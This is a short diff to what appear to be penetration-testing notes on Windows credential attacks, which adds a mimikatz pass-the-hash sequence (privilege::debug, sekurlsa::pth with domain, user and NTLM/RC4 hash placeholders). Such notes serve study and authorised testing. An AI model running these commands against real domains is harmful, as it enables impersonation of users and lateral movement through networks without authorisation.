@@ -26,5 +26,7 @@ We must pay attention to AES256_HMAC and RC4_HMAC keys, as we can use them to fo
 
 -Using mimikatz:
 ```
-sekurlsa
+mimikatz.exe
+privilege::debug
+sekurlsa::pth /domain:<domain> /user:<username> /<ntlm/rc4>: <hash>
 ```
